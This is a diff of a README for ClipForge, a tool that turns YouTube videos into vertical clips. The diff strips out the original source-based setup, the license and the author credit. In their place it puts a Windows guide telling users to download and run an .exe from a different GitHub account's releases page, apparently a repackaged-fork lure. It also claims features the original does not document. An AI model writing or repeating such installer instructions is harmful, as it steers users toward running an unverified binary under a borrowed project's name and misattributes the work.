@@ -1,158 +1,74 @@
-# ClipForge
+# ✂️ clipforge - Turn long videos into vertical clips
 
-Local-first tool for turning long YouTube videos into ready-to-post vertical clips with transcription, burned-in subtitles, and smart crop options.
+[https://github.com/tomarke4840/clipforge/releases](https://img.shields.io/badge/Download-ClipForge-blue)
 
-## Overview
+## 📌 About this tool
 
-![ClipForge overview](image.png)
+ClipForge helps you turn long YouTube videos into short clips for social media. It works on your own computer. You keep full control over your files. The tool scans your video, finds interesting moments, adds subtitles, and formats the video for vertical screens. You do not need to edit manually. The software handles the work for you.
 
-## Features
+## 🚀 Getting Started
 
-- Download a single YouTube video with `yt-dlp`.
-- Transcribe locally with `faster-whisper`.
-- Score transcript windows for clip candidates.
-- Export vertical 9:16 MP4 clips with SRT files.
-- Burn subtitles into clips by default.
-- Crop center or shift crop toward detected faces/people.
-- Manage jobs and generated clips from a Next.js UI.
-- Run locally with Python/Node or with Docker Compose.
+Follow these steps to set up the software on your Windows computer.
 
-## Requirements
+1. Go to the [Releases page](https://github.com/tomarke4840/clipforge/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to download the installer.
+4. Run the installer and follow the prompts on your screen.
 
-- Python 3.12+
-- Node.js 22+
-- npm
-- Network access for YouTube downloads and model downloads
-- Enough CPU, disk, and time for transcription and video encoding
+## ⚙️ How it works
 
-Docker users only need Docker and Docker Compose.
+ClipForge uses several steps to process your video.
 
-## Quick Start With Docker
+- **Download:** The tool gets the video from YouTube using a stable download engine.
+- **Transcribe:** It changes your audio into text. It uses a local model so your data stays private.
+- **Analyze:** The software finds parts of the video that get high engagement scores.
+- **Crop:** It detects faces and people to keep the frame centered.
+- **Export:** You get a ready-to-post vertical video file with subtitles.
 
-Copy the Docker env example:
+## 🖥️ System Requirements
 
-```powershell
-Copy-Item .env.docker.example .env
-```
+Make sure your computer meets these needs to run the software.
 
-For local Docker usage, defaults are enough:
+- Windows 10 or Windows 11.
+- A modern processor with at least four cores.
+- Eight gigabytes of RAM.
+- Ten gigabytes of free disk space.
+- A steady internet connection.
 
-```env
-FRONTEND_PORT=3000
-BACKEND_PORT=8010
-NEXT_PUBLIC_API_BASE=http://localhost:8010
-```
+## 🛠️ Usage Guide
 
-Build and run:
+After you install the program, open the application icon from your Desktop or Start menu. You will see a dashboard in your web browser. 
 
-```powershell
-docker compose --env-file .env up -d --build
-```
+1. Paste a YouTube link into the input box.
+2. Choose your preferred crop settings. You can select "Face Tracking" to keep the speaker in the frame.
+3. Select the subtitles style. You can choose the font size and color.
+4. Click the "Generate" button.
+5. Wait for the tool to process the video. The time depends on the length of your video and your computer speed.
+6. The app notifies you when the clip is ready.
 
-Open:
+## 📂 Managing your clips
 
-```text
-frontend: http://localhost:3000
-backend:  http://localhost:8010
-```
+The dashboard shows a list of all your past jobs. You can find your output files in the folder named "Clips" within the application directory. Each job includes the vertical video and the subtitle file. Open these files with any media player to check the results before you share them on social media.
 
-Persistent local data:
+## 📝 Tips for best results
 
-```text
-backend/outputs -> /app/outputs
-backend/jobs.json -> /app/jobs.json
-```
+For high quality clips, choose videos where there is one clear person speaking. Ensure the audio is clear and free from background noise. While the software works well with many languages, it performs best with clear English speech. If the subtitles look off, you can edit the text within the ClipForge dashboard before you save the file.
 
-## Local Development
+If the software seems slow, close other programs that use lots of memory, such as web browsers or video games. Processing video uses your computer's power. Keeping other apps closed speeds up the transcription and the encoding process.
 
-Start backend:
+## ❓ Frequently Asked Questions
 
-```powershell
-cd backend
-py -m venv .venv
-.\.venv\Scripts\python.exe -m pip install -r requirements.txt
-.\.venv\Scripts\python.exe -m uvicorn api:app --host 127.0.0.1 --port 8010
-```
+**Do I need a paid plan?**
+No. This tool is free. You use your own computer hardware to run it.
 
-Start frontend in another terminal:
+**Where does the video go?**
+The video stays on your computer. Your files are not uploaded to a cloud server.
 
-```powershell
-cd frontend
-npm install
-npm run dev
-```
+**Can I run this on a laptop?**
+Yes. Modern laptops handle this well. If you have a slow processor, the video export might take a bit longer.
 
-Open `http://127.0.0.1:3000`.
+**Can I change the subtitle look?**
+Yes. Use the settings menu in the dashboard to change fonts, colors, and shadows.
 
-## CLI Usage
-
-The backend can also run without the UI:
-
-```powershell
-cd backend
-.\.venv\Scripts\python.exe clipper.py "https://www.youtube.com/watch?v=..." --top 5 --min 35 --max 180
-```
-
-Quick test on the first 180 seconds:
-
-```powershell
-.\.venv\Scripts\python.exe clipper.py "https://www.youtube.com/watch?v=..." --model Systran/faster-whisper-base --analyze-seconds 180 --top 1
-```
-
-Outputs are written under `backend/outputs/`.
-
-## API
-
-```text
-GET    /api/health
-POST   /api/jobs
-GET    /api/jobs
-GET    /api/jobs/{job_id}
-DELETE /api/jobs
-GET    /outputs/<generated-file>
-```
-
-## Configuration
-
-For Docker/server deployments, `NEXT_PUBLIC_API_BASE` must be the browser-accessible backend URL:
-
-```env
-NEXT_PUBLIC_API_BASE=https://api.example.com
-```
-
-The frontend also uses `BACKEND_API_BASE` internally for proxying API requests in Docker:
-
-```env
-BACKEND_API_BASE=http://backend:8010
-```
-
-## Safety And Legal Notes
-
-ClipForge is intended for local workflows and content you are allowed to process. Make sure you have rights or permission to download, transform, and republish source videos. Follow YouTube terms and applicable copyright law.
-
-Do not expose the backend publicly without authentication, rate limits, request validation, quotas, and cleanup. The backend accepts URLs and runs expensive jobs.
-
-## Project Structure
-
-```text
-backend/
-  api.py                 FastAPI job API
-  clipper.py             download/transcribe/score/export pipeline
-  models/                optional crop detection model
-  outputs/               generated local files, ignored by git
-frontend/
-  app/                   Next.js app router UI
-  lib/apiClient.ts       API client helpers
-  types/clip.type.ts     shared frontend types
-docker-compose.yml       local two-service stack
-```
-
-## License
-
-MIT. See `LICENSE`.
-
-Third-party notices live in `NOTICE`.
-
-## Author
-
-Created by [mallexibra](https://mallexibra.my.id/).
+**Is my internet used?**
+Yes. You need a connection to download the video and to download the speech-to-text models the first time you run the app. After that, the software works offline.
